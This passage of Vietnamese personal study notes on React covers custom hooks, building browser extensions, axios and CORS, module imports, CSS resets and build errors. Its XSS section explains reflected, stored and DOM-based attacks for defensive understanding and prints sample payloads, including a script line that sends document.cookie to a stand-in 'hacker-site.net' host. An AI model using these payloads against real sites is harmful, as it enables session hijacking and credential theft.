+Bản chất custom hook nó như 1 lời gọi hàm bth. Mọi hook được gọi trong nó sẽ trở thành 1 hook ở trong component gọi nó nên mọi thay đổi trong custom hook hay thay đổi trong component ban đầu đều làm tất cả render lại mà. Vì component gọi custom hook mà gán cho 1 biến const bên trong thì biến đó coi như 1 state của component
+
+Trong các thư viện đa phần nó cung ra 1 hook thì vẫn giữ nguyên tính chất tương tự. VD const useStyles = makeStyles của MUI cũng là tạo ra 1 customhook về style
+
+Khi nhiều component cùng dùng 1 custom hook thì giá trị biến hook của mỗi cái là độc lập nhau. 1 component - 1 giá trị hook độc lập. Mỗi lần 1 component đó render lại thì hook k tạo lại mà chạy lại như 1 hàm bth thôi. 
+Nếu cái custom hook đó dùng data từ 1 nguồn chung như redux thì các component mới giống nhau chứ giá trị biến của riêng hook đó thì như nhau. 
+
+-> Trap: 
+Khi 1 component vào lần đầu tiên thì biến useState của nó luôn mang giá trị mặc định, custom hook cũng v. Component A dùng customHook B, customHook B dùng useState biến x là null cho useEffect gán là 10, component A sẽ render 2 lần, lần 1 lấy giá trị null và cũng là lần chạy useEffect dependencies [] của A, lần 2 lấy giá trị 10. Ta tưởng component A lấy giá trị custom hook global chuẩn là 10 luôn nhưng thực tế không phải
+=> Lúc này trong useEffect [] của A mà check if x == null thì sẽ chạy nhưng if x == 10 thì k chạy
+
+=> refer tới "Projects / BattleHand"
+
+
+
+# Tạo darkmode bằng React
+Nếu dùng các thư viện UI thì xử lý theme có thể khác nhau vì bản thân các thư viện đã thay đổi css rồi
+
+-> Tạo bằng darkmode bằng React thuần ???? dừng lại vì chưa học scss
+
+
+
+# Tạo browser extension bằng React
+=> Ta k đi theo hướng này vì nó k có ích gì cả. Nếu muốn tạo tự học trên viblo có đầy. Ta chỉ đi qua các khái niệm cơ bản
+
+-> Setup
+create react app như bth.
+
+Nếu ta chạy "npm start" như bth nó sẽ ra 1 trang web ta cần hiển thị. Để tạo ra 1 sản phẩm extension trong react ta phải build nó "yarn run build" sẽ tạo ra thư mục build chứa sản phẩm cuối của ta. Nó có 1 file manifest.
+Ta dùng TT thư mục dự án cũng đc nhưng nó kp là sản phẩm mà phải chạy npm run build mới đc.
+
+-> Tạo extension
+Tạo flie manifest đúng cấu trúc của 1 extension có name, description, version, content_script, background, action,..
+=> trong đó default_popup ta dùng file index.html là file html hiển thị các component React của ta thôi.
+
+Lỗi CSP là Content Security Policy: nó là 1 policy giảm thiểu truy vấn cross-site như kiểu SOP ấy. Với Chrome App, cái policy này sẽ cản trở ta script page(tức cấm thẻ script và các sự kiện như onclick).
+Để khắc phục: ta tạo ra file .env và thêm vào: INLINE_RUNTIME_CHUNK=false
+
+=> tạo ra các file cho content_script và background như bth.
+
+service_worker là file background.js
+
+-> Basic
+Craco(Create react app configuration override) là 1 package giúp chỉnh sửa config của create-react-app. Vì extension ta muốn nó build cả 2 file script là content_script và background nên ta phải config build cho react 2 file đó => tạo file craco.config.js và setup là đc
+=> Xong r chỉnh lại scripts package.json là craco build chứ k dùng react-scripts build mặc định nx
+
+Dòng comment /* eslint-disable no-undef */ lại là bắt buộc trong các file react mà dùng đến variable chrome -> nếu k có dòng comment này thì sẽ k dùng đc biến chrome trong react.
+
+"permissions: ['storage']" tức là có thể dùng chrome.storage để lưu thông tin
+
+extension trong react nó k dùng đc các kiểu onInstalled hay alert ở background=> cơ chế nó k còn như cũ nx, ta nên chú trọng hơn vào vc dùng component react trong index.html khi extension popup
+
+
+
+# Request API
+-> Dùng proxy: bên cạnh việc dùng axios + redux slice chuẩn, nếu connect với chỉ 1 server thì ta còn có cách khác là viết trong file package.json của client trường proxy lưu base url của server. Khi đó trong các request api viết url, ta chỉ cần viết phần đuôi còn base url nó sẽ tự lấy trong proxy
+
+-> Dùng axios
+Mỗi request đều trả ra promise ta có thể dùng .then .catch để xử lý nhưng h toàn dùng try catch + async await
+
+--> Có TH trong 1 vài domain khác k set được giá trị cookies, cái withCredentials set là true khi tạo request sẽ enable việc đó. 
+Đôi khi việc thêm tham số này khiến request bị lỗi blocked by CORS. Khi dùng withCredentials: true thì nó tự dùng "include". Khi đó nó gửi kèm cookies và thông tin user là ai, khi đó phía server phải xử lý attribute Access-Control-Allow-Origin cụ thể chứ k được dùng *, nếu không sẽ bị lỗi CORS Policy. 
+
+Dùng với 1 request: axios.get(BASE_URL + '/todos', { withCredentials: true });
+
+Dùng với mọi url thì có thể: axios.defaults.withCredentials = true
+
+Có thể dùng trong hàm axios.create để set với 1 cụm các request ở 1 domain nào
+
+--> POST: 
+Data gửi server thông qua axios.post phải là 1 object, nên phải convert hết sang object. Kể cả array cx phải convert sang object. Các hàm ở thư viện ngoài thg dùng quy tắc chung là dùng object với mọi loại cho tiện như v
+
+=> refer tới "Tổng kết module JS / Query API trong JS thuần"
+
+--> Dùng axios create và .get của nó sẽ tốt hơn vì params là undefined nó tự động k cho vào param => dùng cho config tốt
+=> refer tới "Projects / Leaderboard trava / Leaderboard Basic / armoury-slice"
+=> refer tới "Tổng kết module JS / # Giá trị đặc biệt"
+
+
+
+# Import export trong React
+Cũng là module "Import export trong NodeJS"
+
+ES6: 2 loại named export(export bình thường) và default export
+export const a = 10;
+export default 12;
+export {function1, pi};
+import {a, b} from ...
+import a from ....
+import * as a from ...
+
+CommonJS: exports là viết tắt của module.exports
+module.exports.a = 1;
+exports.a = 1;
+module.exports = {...}
+const x = require("b");
+
+Hàm require là hàm của Nodejs bên server. 1 số browser k hỗ trợ hàm này nên k thể chạy đc, chỉ chạy trên server. Dùng require sẽ thêm toàn bộ code dự án vào theo thứ tự file js. Còn import của front end là thêm 1 module bất đồng bộ
+
+-> Khi tạo 1 dự án react bình thường, bên ngoài folder src là ta đang dùng code NodeJS tức dùng CommonJS. Các thứ bên trong src là code các phiên bản ES bình thường.
+
+Code CommonJS và ES luôn phân biệt nhau rõ ràng. Nhưng thực tế trong JS thuần ta có thể sử dụng công cụ bên thứ 3 là package Browserify sẽ cho phép phía frontend dùng được CommonJS nhưng điều này là k cần thiết => hình như React mặc định hỗ trợ dùng commonjs sẵn r, tự có polyfill giúp điều đó. Ngược lại, package babel cho phép convert ES6 sang CommonJS để NodeJS dùng được.
+Tool babel cũng giúp cho ta code JSX trên file JS, convert từ code JSX component sang component React.
+
+Trong HTML CSS thuần ta dùng được export và import như v thì file export phải được script vào file html dưới dạng module nhưng trong React config hết r nên k cần.
+
+-> Với các file JS or JSX, file json thì ta có thể export và import từng component có đặt tên, cũng như import theo từng package npm tải về. 
+Với các file như css k có export ta vẫn có thể import trực tiếp trong file js or import 1 file css trong 1 file css khác trực tiếp, mặc nhiên tất cả style file đó đều được áp dụng trong dự án
+Với các file như ảnh png hay svg thì ta import có đặt tên cho nó để dùng thoải mái => thực chất import thì nó sẽ trả ra link static đến ảnh. Nên dùng svg hơn vì có thể làm kiểu hover đổi màu được vì là code css chứ png thì éo
+
+
+
+# Module redux
+# Module Material UI
+# Module react router dom
+# Module SEO trong React
+# Module authentication authorization
+# Module dùng tools cho React
+
+
+
+# CSS Reset cho 1 dự án React bth:
+-> Các thuộc tính chung:
+*{
+  boxSizing: "border-box";
+  margin: 0;
+  padding: 0;
+},
+html{
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  font-smooth: always;
+  height: 100%;
+  width: 100%;
+  overflow-y: scroll;
+}
+body{
+  height: 100%;
+  width: 100%;
+}
+:root{
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen',
+    'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue',
+    sans-serif;
+  text-rendering: optimizeLegibility;
+}
+#root{
+  width: 100%;
+  height: 100%;
+  -webkit-touch-callout: none;
+  overflow: auto;
+}
+=> thuộc tính font-family trên là default của OS, nếu dùng các font riêng thì có thể thêm nó vào đầu or nếu chắc chắn tồn tại thì thay bằng nó luôn or cần dùng với 1 vài thẻ thì định nghĩa thêm vài class riêng dùng các font đó sau chỉ cần add vào.
+
+-> Các thuộc tính khác, đôi khi buộc phải set vì các thư viện nó thay đổi làm nó hỏng:
+img{
+  user-select: none;
+  -webkit-user-drag: none;
+}
+a{
+  text-decoration: none;
+}
+button{
+  text-transform: none;
+  cursor: pointer;
+}
+button:disabled{
+  cursor: not-allowed;
+}
+
+Thẻ canvas cũng cản bôi đen và drag giống img
+body dùng color-scheme light hay dark tùy
+set transition cho :root là 0.5s vì lúc nào ta cũng muốn có 1 chút transition khi chuyển động(transition: all 0.5s linear;)
+
+=> Tùy vc dùng thư viện UI nào mà có thể vc setup và selector ở từng thuộc tính cụ thể sẽ khác về cách viết
+
+-> Mặc định khi quá màn hình mới có scroll, k quá thì k có thanh scroll. Ta có thể custom để quá màn hình thì vẫn k có thanh scroll nhưng vẫn có chức năng scroll. Điều này cần trong những website ngắn thì người dùng nên scroll thay vì dịch đến vị trí luôn:
+body {
+  -ms-overflow-style: none;
+  scrollbar-width: none;
+}
+body::-webkit-scrollbar {
+  display: none;
+}
+
+-> Thông thường ta k muốn chiều dài của page phụ thuộc vào kích thước bên trong mà ta luôn muốn minHeight phải là kích thước màn hình hiện tại để màn hình lớn dù trống vẫn hiển thị header và footer đúng. Khi đó phải bao tất cả bằng 1 thẻ Box với minHeight="calc(100vh - chiều cao header - chiều cao footer)"
+=> refer tới "Projects / Setup / setup react mui web3 full"
+
+
+
+# Other:
+-> Lệnh: npm bin -g => hiển thị các package global đã cài đặt
+
+-> Lỗi npm: 
+--> Lỗi node-gyp: refer tới "## Solidity / # Dùng truffle / # Lỗi khi npm i truffle k chạy được"
+
+-> Tấn công XSS:
+Ngày xưa họ dùng:
+const messageEl = document.getElementById('message');
+messageEl.innerHTML = '<p>' + message.text + '</p>';
+=> trông rất ok cho đến khi: họ nhét JS vào message.text Vd:
+<img src onerror="stealYourPassword()"> nhét vào message.text
+Kiểu tấn công này gọi là XSS, để tránh nó thì người ta dùng textContent.
+Trong React, họ dùng JSX k tránh được hoàn toàn kiểu tấn công này. Nó chỉ k thực thi script chứ nếu HTML thì vẫn dính. VD: input đầu vào gì đó xong hacker chơi kiểu: <div {...userData}>Item or <a href={user.website}>Item thì vẫn toang 
+
+Tấn công XSS(Cross Site Scripting): là kiểu tấn công bằng cách thêm các đoạn script có khả năng truy cập vào thông tin trang web => kbh được tin input ở phía client
+VD: bất cứ trang web nào khi họ dùng tính năng input dữ liệu text vào mà k phòng chống XSS thì rất dễ toang. VD họ làm tính năng addData vào database từ input của người dùng => người dùng add vào: <script>alert("hacked")</script>Item thì database lưu ra như v nhưng khi client khác request vào thì browser lại chạy script kia thế là mọi client khác đều hiện dòng chữ hacked alert ra=> Đó là lý do script rất nguy hiểm, luôn phòng tránh 1 người có khả năng thêm script vào trình duyệt 1 client khác
+Nếu họ cho dữ liệu đó là html thì có thể làm kiểu: <span onmouseover="alert("hacked")"></span> cx đc
+=> Nch là có rất nhiểu kiểu hack XSS nhưng thg thì hacker sẽ dùng code JS để truy cập vào cookies or storage để lấy ra các trường tk mk vì cookies thường lưu luôn tk mk user để đăng nhập nhanh thì với script họ có thể lấy được các thứ đó. Sau đó gửi dữ liệu đó về 1 server khác để lấy
+=> Để phòng chống ta có thể dùng XSS filter, có rất nhiều thư viện cho phép lọc đầu vào của người dùng nếu chứa cái gì thì k cho phép người dùng nhập input như v. Or ta dùng các PP chống vc render JS mỗi khi người dùng nhập input. Lọc các trường <script> bỏ đi chẳng hạn
+Có nhiều tool giúp tấn công XSS với nh hình thức, phổ biến nhất vẫn là tấn công bằng JS và HTML từ phía client chèn script độc hại
+Các loại tấn công XSS:
+1) Reflected XSS: VD chiếm phiên làm vc của người dùng-> chiếm quyền của họ trên website
+Người dùng đăng nhập vào trình duyệt sẽ được gán 1 session cookies -> somehow, hacker gửi cho người dùng 1 URL -> người dùng truy cập vào URL đó -> URL đó là trang web do hacker tạo ra có nhiệm vụ gửi request tới cái trang web kia -> server phản hồi cho nạn nhân kèm dữ liệu có trong request trong đoạn JS của hacker-> trình duyệt nạn nhân nhận phản hồi và thực thi đoạn script -> giả sử đoạn script người dùng tạo ra là: var i=new Image; i.src=”http://hacker-site.net/”+document.cookie;=> là gửi request đến site của hack với tham số là session cookies của người dùng -> từ phía site của mình, hacker bắt được request trên và lấy được session cookies của nạn nhân
+2) Stored XSS: khai thác input k được bảo mật tốt để chèn vào database đoạn mã nguy hiểm
+Hacker chèn script độc hại vào database -> nạn nhân khi nào đó truy cập vào web, nếu nạn nhân là quản trị viên thì mất luôn web -> nạn nhân đăng nhập -> mã độc của hacker được thực thi trên trình duyệt của user lúc đó -> session gửi lại cho hacker -> hacker chiếm được session thì vào web như thg
+=> Nguy hiểm hơn vì phạm vi rộng trong khi Reflected XSS thì hacker phải lừa nạn nhân đăng nhập r truy cập đến url mà hắn ta cung cấp để thực thi mã độc
+3) DOM Based XSS: thay đổi cấu trúc form
+Cơ chế giống như cách 1
+VD: Người dùng đăng nhập vào 1 trang web -> nhưng trước đó hacker lừa người dùng truy cập vào 1 URL của trang web đó để đăng nhập thì url đó là:
+http://example.com/register.php?message=Please fill in the form
+với dòng Please fill in the form được hiện dưới form đăng nhập=> bh url của hacker lại là:
+http://example.com/register.php?message=<label>Gender</label><select class = "form-control" onchange="java_script_:show()"><option value="Male">Male</option><option value="Female">Female</option></select>
+<script>function show(){alert("hacked");}</script>
+=> thì cái dòng please fill in the form biến thành 1 input gender vì browser nó render html như v-> khi người dùng kb vào chọn render thì script được thực thi
+=> CV check lỗi XSS là của tester. Họ có thể thêm: <script>alert(document.cookie)</script> để test thử mọi trường input
+
+=> $$typeof xuất hiện trong mọi component của react. Ở phiên bản cũ thì k và nó bị dùng để tấn công XSS: user nhập input sang server lưu ở dạng JSON -> client khác truy cập sẽ render ra code JS độc hại. Sang phiên bản mới nó dùng kiểu Symbol để đánh dấu react-element => user nhập input k thể đặt 1 Symbol vào file json-> backend k lưu data của user ngay ở dạng file JSON để front end lấy nx mà phải xử lý => Chỉ ok với các trình duyệt phiên bản mới hỗ trợ type Symbol
+
+-> Lỗi: 
+Lỗi hàng loạt với react-scripts => version 5 của react-scripts có thể gây lỗi, có thể xóa và cài lại react-scripts@4.0.3
+
+Lỗi chunk load fail: Thực tế khi build dự án hay chạy dự án thì nó sẽ load file html, trong đó tiếp tục download các file JS và các file helper mà files js đó cần để chạy (Nhìn trong folder build sẽ thấy các file tên chunk). Để tiện cho người dùng, các file JS khi build sẽ bị break thành nhiều file chunk vì fetched dynamically bởi file js chính. Tức nó chỉ được fetch khi cần gọi đến.
+Lỗi này xảy ra khi fetch helper file có vấn đề. Có thể là cái chunk k tìm thấy or bị outdate, thg là khi máy cực lag or gặp lỗi internet or bị cái gì đó chặn k cho fetch. Tái tạo lỗi: build 1 dự án và xóa 1 file chunk đi là gặp lỗi khi chạy
+=> Ở phía client, cách duy nhất để fix là restart và có thể cần xóa cache
+=> Ở phía dev: 
+Về lý thuyết chỉ cần cho nếu user fetch gặp lỗi thì yêu cầu fetch lại chứ k báo lỗi nữa là được. Package webpack-retry-chunk-load-plugin giúp làm điều đó
+Khi ta cập nhập version mới, hãy giữ các older file để dùng trong current session, khi người dùng refresh page thì lastest entry main file js sẽ được download và người dùng được chuyển sang new version. 
+Sử dụng cache-control header để cản browser cache index.html và các file entry js
+
+-> Khi ta tạo react app, nó tự động cài cho ta 1 vài plugin hữu dụng như:
+@babel/plugin-proposal-class-properties: là plugin giúp dùng đc các class property(hay props), dùng arrow function
+@babel/runtime và @babel/plugin-transform-runtime: tự động thay thế các tính năng k đc hỗ trợ của phiên bản ES khi dùng, cung cấp polyfill(các đoạn code được dùng để cung cấp một chức năng (hoặc công nghệ) của các trình duyệt hiện đại cho các trình duyệt cũ),...
+
+-> Dừng: 
+Dùng createApi, fetchBaseQuery của @reduxjs/toolkit/query/react
+
+-> Tổng quan:
+####
+# Tính năng React18
+# Basic
+# Code JSX
+# Về font chữ
+# Cách ref tới 1 thẻ trong component
+# Dùng list trong React
+# Thao tác với form
+# Thao tác với thẻ con
+# Dùng props-type
+# Dùng context
+# Module Bootstrap
+# Dùng react-transition-group 
+# Loading icon
+# Các loại mock data
+# Module senmatic ui react
+# Tạo pagination
+# Dùng HOC
+# React hook cơ bản
+# Dùng useMemo useCallback
+# Dùng về ref
+# Custom hook
+# Các thư viện components
+# Tạo darkmode bằng React
+# Quy tắc chia ra component
+# Tạo browser extension bằng React
+# Request API
+# Module redux
+# Module Material UI
+# Module react router dom
+# Module SEO trong React
+# Module authentication authorization
+# Module dùng tools cho React
+# CSS Reset for React
+# Thư viện react-rainbow-component
+# Dùng bitcloud
+# Other
+####
+
